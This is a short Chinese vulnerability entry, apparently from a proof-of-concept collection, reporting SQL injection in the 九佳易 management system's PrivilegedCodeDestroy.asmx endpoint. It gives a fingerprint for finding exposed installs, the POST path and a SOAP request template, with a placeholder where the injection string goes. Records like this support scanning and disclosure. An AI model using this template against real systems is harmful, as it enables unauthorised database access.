# 九佳易管理系统PrivilegedCodeDestroy.asmx存在SQL注入漏洞

九佳易管理系统 ｜ SQL注入 ｜ —
- **指纹**：`body="/XiTong/Index/W_IndexPbForm.win.js"`
- **请求**：`POST /Interface/licx/PrivilegedCodeDestroy.asmx HTTP/1.1`

**Payload**
```
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
<soap:Header/>
<soap:Body>
<tem:UpdatePrivilegedState>
<!--type: string-->
<tem:code>SQLI_POC</tem:code>
</tem:UpdatePrivilegedState>
</soap:Body>
</soap:Envelope>
```
- **响应特征**：200